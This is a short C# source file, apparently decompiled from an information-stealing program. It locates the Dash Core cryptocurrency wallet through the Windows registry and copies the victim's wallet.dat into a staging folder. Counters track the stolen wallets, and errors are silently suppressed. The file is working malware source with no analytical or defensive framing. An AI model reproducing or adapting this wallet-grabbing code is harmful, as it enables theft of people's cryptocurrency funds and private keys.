using System.IO;
using Microsoft.Win32;

internal class Class64
{
	public static int int_0;

	public static void smethod_0(string string_0)
	{
		try
		{
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey("Dash")!.OpenSubKey("Dash-Qt");
			Directory.CreateDirectory(string_0 + "\\Wallets\\DashCore\\");
			File.Copy(registryKey!.GetValue("strDataDir")!.ToString() + "\\wallet.dat", string_0 + "\\DashCore\\wallet.dat");
			int_0++;
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
